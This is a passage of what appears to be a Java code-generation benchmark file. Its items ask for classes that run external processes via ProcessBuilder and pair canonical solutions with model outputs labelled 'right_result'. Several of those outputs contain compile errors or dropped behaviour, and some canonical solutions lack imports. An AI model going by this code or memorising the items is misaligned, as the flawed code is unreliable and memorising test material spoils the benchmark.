    "Canonical_solution": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.List;\n\npublic static String deobfuscateToString(Throwable t) {\n    StringWriter sw = new StringWriter();\n    PrintWriter pw = new PrintWriter(sw);\n    t.printStackTrace(pw);\n    String stackTrace = sw.toString();\n    stackTrace = stackTrace.replaceAll(\"at .+/(.+)\", \"at $1\");\n\n    try {\n        if (!canDeobfuscate()) {\n            return stackTrace;\n        }\n\n        var file = Files.createTempFile(\"xpipe_stracktrace\", null);\n        Files.writeString(file, stackTrace);\n        var proc = new ProcessBuilder(\n                        \"retrace.\" + (OsType.getLocal().equals(OsType.WINDOWS) ? \"bat\" : \"sh\"),\n                        System.getenv(\"XPIPE_MAPPING\"),\n                        file.toString())\n                .redirectErrorStream(true);\n        var active = proc.start();\n        var out = new String(active.getInputStream().readAllBytes())\n                .replaceAll(\"\\r\\n\", NewLine.LF.getNewLineString());\n        var code = active.waitFor();\n        if (code == 0) {\n            return out;\n        } else {\n            System.err.println(\"Deobfuscation failed: \" + out);\n        }\n    } catch (Exception ex) {\n        System.err.println(\"Deobfuscation failed\");\n        return stackTrace;\n    }\n\n    return stackTrace;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.*;\nimport java.nio.file.*;\n\npublic class StackTraceDeobfuscator {\n    public static String deobfuscateStackTrace(Throwable t) throws IOException {\n        if (!canDeobfuscate()) return t.toString();\n        \n        Path tempFile = Files.createTempFile(\"stack_trace\", \".txt\");\n        try (PrintWriter writer = new PrintWriter(tempFile.toFile())) {\n            writer.println(t);\n        }\n        \n        ProcessBuilder pb = new ProcessBuilder(\n            \"bash\",\n            \"-c\",\n            System.getenv(\"XPIPE_MAPPING\") + \"/retrace.sh \" + tempFile.toAbsolutePath()\n        );\n        if (System.getProperty(\"os.name\").toLowerCase().contains(\"win\")) {\n            pb.command(\"cmd.exe\", \"/C\", System.getenv(\"XPIPE_MAPPING\") + \"\\\\retrace.bat\", tempFile.toAbsolutePath());\n        }\n        \n        Process process;\n        try {\n            process = pb.start();\n        } catch (IOException e) {\n            return t.toString();\n        }\n        \n        StringBuilder output = new StringBuilder();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            output.append(line).append(\"\\n\");\n        }\n        \n        int exitCode;\n        try {\n            exitCode = process.waitFor();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            return t.toString();\n        }\n        \n        if (exitCode == 0) {\n            return output.toString();\n        } else {\n            return t.toString();\n        }\n    }\n\n    private static boolean canDeobfuscate() {\n        // Implementation of canDeobfuscate() goes here\n        return true; // Placeholder\n    }\n}\n```"
  },
  {
    "Task_id": 275,
    "Instruction": "Task Description: Create a Java class that manages external processes, handling their input/output streams and providing control over process execution, including starting, stopping, and monitoring.\n\nClass Description: The DaemonHandler class is designed to manage external processes executed via ProcessBuilder. It provides functionality to start processes with either delimited or undelimited output handling, stop processes (either gracefully or forcibly), and retrieve process exit codes. The class maintains separate threads for handling standard output and error streams, with output being captured and placed into a shared blocking deque.\n\nAttributes:\n- processBuilder: ProcessBuilder - Configures and starts external processes\n- process: Process - Represents the currently running external process\n- outThread: Thread - Thread handling standard output stream\n- errThread: Thread - Thread handling error output stream\n- errProxy: OutputProxy - Proxy for handling error stream output\n- outProxy: OutputProxy - Proxy for handling standard output stream\n- deque: BlockingDeque<Event> - Shared queue for process output events\n- stdOut: boolean - Flag indicating whether to capture standard output\n\nMethods:\n- DaemonHandler(BlockingDeque<Event>, String...) -> void - Constructor that initializes the process handler with output queue and command\n- setStdOutListener(boolean) -> void - Sets whether to capture standard output\n- startDelimited() -> Process - Starts process with delimited output handling (using default delimiter)\n- startDelimited(byte) -> Process - Starts process with custom delimiter for output handling\n- startUndelimited() -> Process - Starts process with undelimited output handling (default buffer size)\n- startUndelimited(int) -> Process - Starts process with undelimited output handling (custom buffer size)\n- stop(boolean) -> void - Stops the managed process (optionally forcibly)\n- getExitCode() -> int - Retrieves the exit code of the process (or PROCESS_STOPPED if not running)",
    "Canonical_solution": "import com.linbit.extproc.OutputProxy.Event;\nimport java.io.IOException;\nimport java.lang.ProcessBuilder.Redirect;\nimport java.util.concurrent.BlockingDeque;\nimport java.util.concurrent.TimeUnit;\n\npublic class DaemonHandler\n{\n    public static final int PROCESS_STOPPED = Integer.MAX_VALUE;\n    private static final byte DELIMITER = '\\n';\n\n    private final ProcessBuilder processBuilder;\n    private Process process;\n\n    private Thread outThread;\n    private Thread errThread;\n    private OutputProxy errProxy;\n    private OutputProxy outProxy;\n\n    private final BlockingDeque<Event> deque;\n    private boolean stdOut;\n\n    public DaemonHandler(final BlockingDeque<Event> dequeRef, final String... command)\n    {\n        deque = dequeRef;\n        processBuilder = new ProcessBuilder(command);\n        processBuilder.redirectError(Redirect.PIPE);\n        stdOut = true;\n    }\n\n    public void setStdOutListener(boolean stdOutRef)\n    {\n        stdOut = stdOutRef;\n    }\n\n    public Process startDelimited() throws IOException\n    {\n        return startDelimited(DELIMITER);\n    }\n\n    public Process startDelimited(byte delimiterRef) throws IOException\n    {\n        stop(true);\n\n        process = processBuilder.start();\n        errProxy = new OutputProxyDelimited(process.getErrorStream(), deque, delimiterRef, false);\n        errThread = new Thread(errProxy);\n        if (stdOut)\n        {\n            outProxy = new OutputProxyDelimited(process.getInputStream(), deque, delimiterRef, true);\n            outThread = new Thread(outProxy);\n            outThread.start();\n        }\n        errThread.start();\n        return process;\n    }\n\n    public Process startUndelimited() throws IOException\n    {\n        return startUndelimited(OutputProxy.DFLT_BUFFER_SIZE);\n    }\n\n    public Process startUndelimited(int bufferSize) throws IOException\n    {\n        stop(true);\n\n        process = processBuilder.start();\n        errProxy = new OutputProxy(process.getErrorStream(), deque, false, bufferSize);\n        errThread = new Thread(errProxy);\n        if (stdOut)\n        {\n            outProxy = new OutputProxy(process.getInputStream(), deque, true, bufferSize);\n            outThread = new Thread(outProxy);\n            outThread.start();\n        }\n        errThread.start();\n        return process;\n    }\n\n    public void stop(boolean force)\n    {\n        if (process != null)\n        {\n            if (outProxy != null)\n            {\n                outProxy.expectShutdown();\n            }\n            errProxy.expectShutdown();\n            if (force)\n            {\n                process.destroyForcibly();\n            }\n            else\n            {\n                process.destroy();\n            }\n            if (outThread != null)\n            {\n                outThread.interrupt();\n            }\n            errThread.interrupt();\n            process = null;\n        }\n    }\n\n    public int getExitCode()\n    {\n        int exitValue;\n        Process proc = process;\n        if (proc != null)\n        {\n            if (proc.isAlive())\n            {\n                try\n                {\n                    proc.waitFor(500, TimeUnit.MILLISECONDS);\n                }\n                catch (InterruptedException ignored)\n                {\n                }\n                if (proc.isAlive())\n                {\n                    throw new ImplementationError(\"Process is still running\");\n                }\n            }\n            exitValue = proc.exitValue();\n        }\n        else\n        {\n            exitValue = PROCESS_STOPPED;\n        }\n        return exitValue;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.util.concurrent.BlockingDeque;\n\npublic class DaemonHandler {\n    private ProcessBuilder processBuilder;\n    private Process process;\n    private Thread outThread;\n    private Thread errThread;\n    private OutputProxy errProxy;\n    private OutputProxy outProxy;\n    private BlockingDeque<Event> deque;\n    private boolean stdOut;\n\n    public DaemonHandler(BlockingDeque<Event> deque, String... command) {\n        this.deque = deque;\n        this.processBuilder = new ProcessBuilder(command);\n    }\n\n    public void setStdOutListener(boolean stdOut) {\n        this.stdOut = stdOut;\n    }\n\n    public Process startDelimited() throws IOException {\n        return startDelimited((byte) 0);\n    }\n\n    public Process startDelimited(byte delimiter) throws IOException {\n        processBuilder.redirectErrorStream(true);\n        process = processBuilder.start();\n        if (stdOut) {\n            outProxy = new OutputProxy(process.getInputStream(), delimiter, deque);\n            outThread = new Thread(outProxy);\n            outThread.start();\n        }\n        return process;\n    }\n\n    public Process startUndelimited() throws IOException {\n        return startUndelimited(1024);\n    }\n\n    public Process startUndelimited(int bufferSize) throws IOException {\n        processBuilder.redirectErrorStream(true);\n        process = processBuilder.start();\n        if (stdOut) {\n            outProxy = new OutputProxy(process.getInputStream(), bufferSize, deque);\n            outThread = new Thread(outProxy);\n            outThread.start();\n        }\n        return process;\n    }\n\n    public void stop(boolean force) {\n        if (process != null) {\n            try {\n                if (force) {\n                    process.destroyForcibly();\n                } else {\n                    process.destroy();\n                }\n                process.waitFor();\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n\n    public int getExitCode() {\n        if (process == null || !process.isAlive()) {\n            return process == null ? -1 : process.exitValue();\n        }\n        return -1;\n    }\n\n    private static class OutputProxy implements Runnable {\n        private InputStream inputStream;\n        private byte delimiter;\n        private BlockingDeque<Event> deque;\n        private int bufferSize;\n\n        public OutputProxy(InputStream inputStream, byte delimiter, BlockingDeque<Event> deque) {\n            this.inputStream = inputStream;\n            this.delimiter = delimiter;\n            this.deque = deque;\n        }\n\n        public OutputProxy(InputStream inputStream, int bufferSize, BlockingDeque<Event> deque) {\n            this.inputStream = inputStream;\n            this.bufferSize = bufferSize;\n            this.deque = deque;\n        }\n\n        @Override\n        public void run() {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n            try {\n                if (delimiter != 0) {\n                    int ch;\n                    StringBuilder sb = new StringBuilder();\n                    while ((ch = reader.read()) != -1) {\n                        if (ch == delimiter) {\n                            deque.put(new Event(sb.toString()));\n                            sb.setLength(0);\n                        } else {\n                            sb.append((char) ch);\n                        }\n                    }\n                    if (sb.length() > 0) {\n                        deque.put(new Event(sb.toString()));\n                    }\n                } else {\n                    char[] buffer = new char[bufferSize];\n                    int len;\n                    while ((len = reader.read(buffer)) != -1) {\n                        deque.put(new Event(String.copyValueOf(buffer, 0, len)));\n                    }\n                }\n            } catch (IOException | InterruptedException e) {\n                Thread.currentThread().interrupt();\n            } finally {\n                try {\n                    reader.close();\n                } catch (IOException e) {\n                    // Handle exception\n                }\n            }\n        }\n    }\n\n    public static class Event {\n        private String data;\n\n        public Event(String data) {\n            this.data = data;\n        }\n\n        public String getData() {\n            return data;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 276,
    "Instruction": "Task Description: Create a Java abstract class that provides functionality for executing external scripts in a cross-platform manner, handling both input and error streams concurrently, and logging the results.\n\nClass Description: AbstractScriptProcessor is an abstract base class designed to execute external scripts (shell scripts for Unix-like systems or batch files for Windows) while properly handling process streams and logging. It uses ProcessBuilder for process creation and ForkJoinPool for concurrent stream handling.\n\nAttributes:\n- POOL: [ForkJoinPool] - A shared thread pool for concurrent stream processing\n- SH_SHELL: [String] - Constant for Unix shell path (/bin/sh)\n- CMD_SHELL: [String] - Constant for Windows command processor (cmd.exe)\n\nMethods:\n- executeScript: [TaskContext context, String scriptPath] -> [ProcessResult] - Executes the specified script file, handles platform compatibility checks, manages process streams, and returns execution results\n- copyStream: [InputStream is, StringBuilder sb, OmsLogger omsLogger, Charset charset] -> [void] - Helper method to copy stream contents to a StringBuilder while logging\n- getRunCommand: [] -> [String] - Abstract method to be implemented by subclasses to return the appropriate shell command\n- getCharset: [] -> [Charset] - Returns the charset to use for stream processing (defaults to UTF-8)",
    "Canonical_solution": "import tech.powerjob.worker.core.processor.ProcessResult;\nimport tech.powerjob.worker.core.processor.TaskContext;\nimport tech.powerjob.worker.log.OmsLogger;\nimport org.apache.commons.lang3.StringUtils;\nimport org.apache.commons.lang3.SystemUtils;\nimport java.io.*;\nimport java.nio.charset.Charset;\nimport java.nio.file.Files;\nimport java.util.concurrent.ForkJoinPool;\nimport java.util.concurrent.ForkJoinTask;\n\npublic abstract class AbstractScriptProcessor {\n\n    private static final ForkJoinPool POOL = new ForkJoinPool(4 * Runtime.getRuntime().availableProcessors());\n    protected static final String SH_SHELL = \"/bin/sh\";\n    protected static final String CMD_SHELL = \"cmd.exe\";\n\n    protected ProcessResult executeScript(TaskContext context, String scriptPath) throws Exception {\n        OmsLogger omsLogger = context.getOmsLogger();\n        \n        if (SystemUtils.IS_OS_WINDOWS && StringUtils.equals(getRunCommand(), SH_SHELL)) {\n            String message = String.format(\"[SYSTEM] Current OS is %s where shell scripts cannot run.\", SystemUtils.OS_NAME);\n            omsLogger.warn(message);\n            return new ProcessResult(false, message);\n        }\n\n        ProcessBuilder pb = StringUtils.equals(getRunCommand(), CMD_SHELL) ?\n                new ProcessBuilder(getRunCommand(), \"/c\", scriptPath)\n                : new ProcessBuilder(getRunCommand(), scriptPath);\n        Process process = pb.start();\n\n        StringBuilder inputBuilder = new StringBuilder();\n        StringBuilder errorBuilder = new StringBuilder();\n\n        boolean success = true;\n        String result;\n\n        final Charset charset = getCharset();\n        try {\n            InputStream is = process.getInputStream();\n            InputStream es = process.getErrorStream();\n\n            ForkJoinTask<?> inputSubmit = POOL.submit(() -> copyStream(is, inputBuilder, omsLogger, charset));\n            ForkJoinTask<?> errorSubmit = POOL.submit(() -> copyStream(es, errorBuilder, omsLogger, charset));\n\n            success = process.waitFor() == 0;\n\n            inputSubmit.get();\n            errorSubmit.get();\n\n        } catch (InterruptedException ie) {\n            omsLogger.info(\"[SYSTEM] ScriptProcessor has been interrupted\");\n        } finally {\n            result = String.format(\"[INPUT]: %s;[ERROR]: %s\", inputBuilder, errorBuilder);\n        }\n        return new ProcessResult(success, result);\n    }\n\n    private void copyStream(InputStream is, StringBuilder sb, OmsLogger omsLogger, Charset charset) {\n        String line;\n        try (BufferedReader br = new BufferedReader(new InputStreamReader(is, charset))) {\n            while ((line = br.readLine()) != null) {\n                sb.append(line).append(System.lineSeparator());\n                omsLogger.info(line);\n            }\n        } catch (Exception e) {\n            omsLogger.warn(\"[SYSTEM] copyStream failed.\", e);\n            sb.append(\"Exception: \").append(e);\n        } finally {\n            try {\n                is.close();\n            } catch (IOException e) {\n                omsLogger.warn(\"[SYSTEM] close stream failed.\", e);\n            }\n        }\n    }\n\n    protected abstract String getRunCommand();\n\n    protected Charset getCharset() {\n        return StandardCharsets.UTF_8;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.*;\nimport java.nio.charset.Charset;\nimport java.util.concurrent.ForkJoinPool;\nimport java.util.logging.Logger;\n\npublic abstract class AbstractScriptProcessor {\n    protected static final ForkJoinPool POOL = new ForkJoinPool();\n    protected static final String SH_SHELL = \"/bin/sh\";\n    protected static final String CMD_SHELL = \"cmd.exe\";\n\n    public ProcessResult executeScript(TaskContext context, String scriptPath) throws IOException, InterruptedException {\n        ProcessBuilder pb = new ProcessBuilder(getRunCommand(), scriptPath);\n        pb.directory(context.getWorkingDirectory());\n        Process process = pb.start();\n\n        StringBuilder output = new StringBuilder();\n        StringBuilder error = new StringBuilder();\n\n        POOL.execute(() -> copyStream(process.getInputStream(), output, Logger.getLogger(AbstractScriptProcessor.class.getName()), getCharset()));\n        POOL.execute(() -> copyStream(process.getErrorStream(), error, Logger.getLogger(AbstractScriptProcessor.class.getName()), getCharset()));\n\n        int exitCode = process.waitFor();\n        return new ProcessResult(exitCode, output.toString(), error.toString());\n    }\n\n    private void copyStream(InputStream is, StringBuilder sb, Logger logger, Charset charset) {\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(is, charset))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line).append(System.lineSeparator());\n                logger.info(line);\n            }\n        } catch (IOException e) {\n            logger.severe(\"Error reading stream: \" + e.getMessage());\n        }\n    }\n\n    protected abstract String getRunCommand();\n    protected Charset getCharset() {\n        return Charset.forName(\"UTF-8\");\n    }\n\n    public static class TaskContext {\n        private File workingDirectory;\n\n        public TaskContext(File workingDirectory) {\n            this.workingDirectory = workingDirectory;\n        }\n\n        public File getWorkingDirectory() {\n            return workingDirectory;\n        }\n    }\n\n    public static class ProcessResult {\n        private int exitCode;\n        private String output;\n        private String error;\n\n        public ProcessResult(int exitCode, String output, String error) {\n            this.exitCode = exitCode;\n            this.output = output;\n            this.error = error;\n        }\n\n        public int getExitCode() {\n            return exitCode;\n        }\n\n        public String getOutput() {\n            return output;\n        }\n\n        public String getError() {\n            return error;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 277,
    "Instruction": "Task Description: The task involves creating a Java class that utilizes ProcessBuilder to execute external processes, specifically for performance monitoring and data collection using the 'perf' tool. The class should handle process execution, stream management, and synchronization.\n\nClass Description: This class is designed to interact with the Linux 'perf' performance monitoring tool. It provides functionality to parse performance events and add JVM invocation options for performance recording. The class manages process execution, handles input/output streams, and ensures proper synchronization.\n\nAttributes:\n- sampleFrequency: [String] - The sampling frequency for performance recording\n- optFrequency: [OptionSpec<String>] - Configuration option for frequency setting\n- perfBinData: [File] - File object storing binary performance data (implied from context)\n- perfParsedData: [File] - File object for storing parsed performance data (implied from context)\n- requestedEventNames: [Collection<String>] - Collection of performance event names to monitor (implied from context)\n\nMethods:\n- parseEvents() -> [void] - Executes the 'perf script' command to parse binary performance data, redirects process output streams to a file, and waits for process completion\n- addJVMInvokeOptions(BenchmarkParams params) -> [Collection<String>] - Generates command-line options for 'perf record' with specified sampling frequency and events\n- InputStreamDrainer(InputStream, OutputStream) -> [void] - Helper class/thread for draining process streams (implied from context)",
    "Canonical_solution": "import java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.util.Arrays;\nimport java.util.Collection;\nimport org.openjdk.jmh.infra.BenchmarkParams;\nimport org.openjdk.jmh.util.Utils;\n\nprivate String sampleFrequency;\nprivate OptionSpec<String> optFrequency;\n\n@Override\nprotected void parseEvents() {\n    try (FileOutputStream fos = new FileOutputStream(perfParsedData.file())) {\n        ProcessBuilder pb = new ProcessBuilder(PerfSupport.PERF_EXEC, \"script\", \"--fields\", \"time,event,ip,sym,dso\", \"--input\", perfBinData.getAbsolutePath());\n        Process p = pb.start();\n\n        InputStreamDrainer errDrainer = new InputStreamDrainer(p.getErrorStream(), fos);\n        InputStreamDrainer outDrainer = new InputStreamDrainer(p.getInputStream(), fos);\n\n        errDrainer.start();\n        outDrainer.start();\n\n        p.waitFor();\n\n        errDrainer.join();\n        outDrainer.join();\n    } catch (IOException | InterruptedException ex) {\n        throw new IllegalStateException(ex);\n    }\n}\n\n@Override\npublic Collection<String> addJVMInvokeOptions(BenchmarkParams params) {\n    return Arrays.asList(PerfSupport.PERF_EXEC, \"record\", \"--freq\", String.valueOf(sampleFrequency), \"--event\", Utils.join(requestedEventNames, \",\"), \"--output\", perfBinData.getAbsolutePath());\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.File;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.util.Collection;\nimport java.util.concurrent.Callable;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.Future;\n\npublic class PerfMonitor {\n    private String sampleFrequency;\n    private OptionSpec<String> optFrequency;\n    private File perfBinData;\n    private File perfParsedData;\n    private Collection<String> requestedEventNames;\n\n    public void parseEvents() throws IOException, InterruptedException, ExecutionException {\n        ProcessBuilder pb = new ProcessBuilder(\"perf\", \"script\", \"-i\", perfBinData.getAbsolutePath(), \"-o\", perfParsedData.getAbsolutePath());\n        Process process = pb.start();\n\n        ExecutorService executor = Executors.newFixedThreadPool(2);\n        Future<?> future1 = executor.submit(new InputStreamDrainer(process.getInputStream(), System.out));\n        Future<?> future2 = executor.submit(new InputStreamDrainer(process.getErrorStream(), System.err));\n\n        int exitCode = process.waitFor();\n        future1.get();\n        future2.get();\n\n        if (exitCode != 0) {\n            throw new ExecutionException(\"Perf script failed with exit code: \" + exitCode);\n        }\n    }\n\n    public Collection<String> addJVMInvokeOptions(BenchmarkParams params) {\n        // Implementation of adding JVM invocation options\n        return null; // Placeholder\n    }\n\n    static class InputStreamDrainer implements Callable<Void> {\n        private InputStream inputStream;\n        private OutputStream outputStream;\n\n        public InputStreamDrainer(InputStream inputStream, OutputStream outputStream) {\n            this.inputStream = inputStream;\n            this.outputStream = outputStream;\n        }\n\n        @Override\n        public Void call() throws Exception {\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                outputStream.write(buffer, 0, bytesRead);\n            }\n            return null;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 278,
    "Instruction": "Task Description: Create a Java function that executes an FFmpeg process to convert a video file into NUT format with raw video and audio codecs, then reads and processes the output using a NutReader.\n\nFunction Description: The function testNutReader() configures and executes an FFmpeg process to convert an input video file into NUT format with specific codec settings (rawvideo for video, pcm_s32le for audio). It then reads and processes the output stream using a NutReader with custom handlers for stream and frame events. The function ensures proper process synchronization by waiting for the FFmpeg process to complete.\n\nInput: None (uses a predefined input file Samples.big_buck_bunny_720p_1mb)\n\nOutput: None (void return type), but the function:\n1. Executes an FFmpeg conversion process\n2. Processes the output through NutReader callbacks\n3. Asserts the process completed successfully (exit code 0)\n\nExceptions:\n- InterruptedException: If the thread is interrupted while waiting for the process\n- ExecutionException: If there's an error in process execution\n- IOException: If there's an I/O error during process handling\n- LineUnavailableException: If there's an audio line availability issue",
    "Canonical_solution": "import java.io.IOException;\nimport java.util.List;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport javax.sound.sampled.LineUnavailableException;\n\npublic void testNutReader()\n    throws InterruptedException, ExecutionException, IOException, LineUnavailableException {\n\n    List<String> args =\n        new FFmpegBuilder()\n            .setInput(Samples.big_buck_bunny_720p_1mb)\n            .done()\n            .addStdoutOutput()\n            .setFormat(\"nut\")\n            .setVideoCodec(\"rawvideo\")\n            .setVideoPixelFormat(\"argb\")\n            .setAudioCodec(\"pcm_s32le\")\n            .done()\n            .build();\n\n    List<String> newArgs =\n        ImmutableList.<String>builder().add(FFmpeg.DEFAULT_PATH).addAll(args).build();\n\n    ProcessBuilder builder = new ProcessBuilder(newArgs);\n    Process p = builder.start();\n\n    new NutReader(\n            p.getInputStream(),\n            new NutReaderListener() {\n                @Override\n                public void stream(Stream stream) {\n                    // Audio stream handling logic\n                }\n\n                @Override\n                public void frame(Frame frame) {\n                    // Frame processing logic\n                }\n            })\n        .read();\n\n    assertEquals(0, p.waitFor());\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport javax.sound.sampled.LineUnavailableException;\n\npublic class FFmpegToNutConverter {\n\n    public static void testNutReader() throws InterruptedException, ExecutionException, IOException, LineUnavailableException {\n        Path inputPath = Paths.get(\"Samples/big_buck_bunny_720p_1mb.mp4\");\n        ProcessBuilder pb = new ProcessBuilder(\n                \"ffmpeg\",\n                \"-i\", inputPath.toString(),\n                \"-c:v\", \"rawvideo\",\n                \"-c:a\", \"pcm_s32le\",\n                \"output.nut\"\n        );\n        \n        Process process = pb.start();\n        \n        // Assuming NutReader is defined elsewhere with appropriate event handlers\n        NutReader reader = new NutReader(process.getInputStream());\n        reader.processEvents();\n        \n        int exitCode = process.waitFor();\n        assert exitCode == 0 : \"FFmpeg process did not complete successfully\";\n    }\n}\n```"
  },
  {
    "Task_id": 279,
    "Instruction": "Task Description: Create a Java class that facilitates interaction with external processes through command execution, providing methods for writing input, executing commands, and retrieving results, with support for timeout handling and resource cleanup.\n\nClass Description: The Command class encapsulates functionality for executing and interacting with external processes. It handles process creation, input/output stream management, command execution, and result collection, with features for line-based input, process termination, and timeout control.\n\nAttributes:\n\nprocess: [Process] - The running external process instance\nstdIn: [OutputStream] - Stream for writing input to the process\nstdOut: [File] - Temporary file storing the process's standard output\nstdErr: [File] - Temporary file storing the process's error output\nnextLine: [String] - Line separator string for command input\nexit: [String] - Command string to terminate the process\ncharset: [Charset] - Character encoding for input/output\nstartTime: [LocalDateTime] - Timestamp when the process was started\n\nMethods:\n\nof: [of(String init)] -> [Command] - Creates a Command instance with default settings\nof: [of(String init, Charset charset)] -> [Command] - Creates a Command instance with specified charset\nof: [of(String init, String nextLine, String exit, Charset charset)] -> [Command] - Creates a Command instance with custom settings\nwrite: [write(String str)] -> [Command] - Writes a string to the process's input stream\nline: [line()] -> [Command] - Writes a line separator to the process's input stream\nexit: [exit()] -> [Command] - Sends the exit command to terminate the process\nexec: [exec(String str)] -> [Command] - Executes a command string (writes input and adds line separator)\nresult: [result()] -> [CommandResult] - Waits for process completion and returns results\nresult: [result(long millis)] -> [CommandResult] - Waits with timeout for process completion\nclose: [close()] -> [void] - Terminates the process and releases resources",
    "Canonical_solution": "import java.io.File;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.nio.charset.Charset;\nimport java.time.LocalDateTime;\nimport java.util.StringTokenizer;\nimport java.util.concurrent.TimeUnit;\n\npublic final class Command {\n\n    public static final String NEXT_LINE = SystemUtils.lineSeparator();\n    public static final String EXIT_COMMAND = \"exit\";\n\n    private final Process process;\n    private final OutputStream stdIn;\n    private final File stdOut;\n    private final File stdErr;\n    private final String nextLine;\n    private final String exit;\n    private final Charset charset;\n    private final LocalDateTime startTime;\n\n    private Command(String init, String nextLine, String exit, Charset charset) throws IOException {\n        if (!StringUtils.hasText(init)) {\n            throw new IllegalArgumentException(\"Empty init\");\n        }\n        StringTokenizer st = new StringTokenizer(init);\n        String[] cmdArray = new String[st.countTokens()];\n        for (int i = 0; st.hasMoreTokens(); i++) {\n            cmdArray[i] = st.nextToken();\n        }\n\n        this.stdOut = FileUtils.createTemp();\n        this.stdErr = FileUtils.createTemp();\n\n        ProcessBuilder builder = new ProcessBuilder(cmdArray).redirectError(this.stdErr).redirectOutput(this.stdOut);\n        this.process = builder.start();\n        this.stdIn = this.process.getOutputStream();\n        this.nextLine = nextLine;\n        this.exit = exit;\n        this.charset = charset;\n        this.startTime = LocalDateTime.now();\n    }\n\n    public static Command of(String init) throws IOException {\n        return of(init, SystemUtils.charset());\n    }\n\n    public static Command of(String init, Charset charset) throws IOException {\n        return of(init, NEXT_LINE, EXIT_COMMAND, charset);\n    }\n\n    public static Command of(String init, String nextLine, String exit, Charset charset) throws IOException {\n        return new Command(init, nextLine, exit, charset);\n    }\n\n    public Command write(String str) throws IOException {\n        this.stdIn.write(str.getBytes(this.charset));\n        this.stdIn.flush();\n        return this;\n    }\n\n    public Command line() throws IOException {\n        return write(this.nextLine);\n    }\n\n    public Command exit() throws IOException {\n        write(this.exit);\n        return line();\n    }\n\n    public Command exec(String str) throws IOException {\n        write(str);\n        return line();\n    }\n\n    public CommandResult result() throws InterruptedException {\n        this.process.waitFor();\n        return CommandResult.of(this.stdOut, this.stdErr, this.startTime, LocalDateTime.now(), this.charset);\n    }\n\n    public CommandResult result(long millis) throws InterruptedException, CommandTimeoutException {\n        if (this.process.waitFor(millis, TimeUnit.MILLISECONDS)) {\n            return result();\n        }\n        this.process.destroyForcibly();\n        throw new CommandTimeoutException();\n    }\n\n    public void close() {\n        this.process.destroy();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.*;\nimport java.nio.charset.Charset;\nimport java.time.LocalDateTime;\n\npublic class Command {\n    private Process process;\n    private OutputStream stdIn;\n    private File stdOut;\n    private File stdErr;\n    private String nextLine = \"\\n\";\n    private String exit = \"exit\";\n    private Charset charset = Charset.defaultCharset();\n    private LocalDateTime startTime;\n\n    public static Command of(String init) {\n        return new Command(init);\n    }\n\n    public static Command of(String init, Charset charset) {\n        return new Command(init, charset);\n    }\n\n    public static Command of(String init, String nextLine, String exit, Charset charset) {\n        return new Command(init, nextLine, exit, charset);\n    }\n\n    private Command(String init) {\n        this(init, Charset.defaultCharset());\n    }\n\n    private Command(String init, Charset charset) {\n        this(init, \"\\n\", \"exit\", charset);\n    }\n\n    private Command(String init, String nextLine, String exit, Charset charset) {\n        try {\n            this.nextLine = nextLine;\n            this.exit = exit;\n            this.charset = charset;\n            ProcessBuilder pb = new ProcessBuilder(\"sh\", \"-c\", init);\n            pb.redirectErrorStream(true);\n            process = pb.start();\n            stdIn = process.getOutputStream();\n            stdOut = File.createTempFile(\"stdout\", \".tmp\");\n            stdErr = File.createTempFile(\"stderr\", \".tmp\");\n            stdOut.createNewFile();\n            stdErr.createNewFile();\n            startTime = LocalDateTime.now();\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public Command write(String str) throws IOException {\n        stdIn.write(str.getBytes(charset));\n        return this;\n    }\n\n    public Command line() throws IOException {\n        stdIn.write(nextLine.getBytes(charset));\n        return this;\n    }\n\n    public Command exit() throws IOException {\n        write(exit).line();\n        return this;\n    }\n\n    public Command exec(String str) throws IOException {\n        write(str).line();\n        return this;\n    }\n\n    public CommandResult result() {\n        return result(Long.MAX_VALUE);\n    }\n\n    public CommandResult result(long millis) {\n        try {\n            if (!process.waitFor(millis, TimeUnit.MILLISECONDS)) {\n                process.destroyForcibly();\n            }\n            BufferedReader reader = new BufferedReader(new InputStreamReader(stdOut, charset));\n            StringBuilder out = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                out.append(line).append(\"\\n\");\n            }\n            return new CommandResult(out.toString(), stdErr.exists() ? Files.readString(stdErr.toPath(), charset) : \"\");\n        } catch (InterruptedException | IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public void close() {\n        try {\n            exit().result();\n            stdIn.close();\n            stdOut.deleteOnExit();\n            stdErr.deleteOnExit();\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public static class CommandResult {\n        private final String stdout;\n        private final String stderr;\n\n        public CommandResult(String stdout, String stderr) {\n            this.stdout = 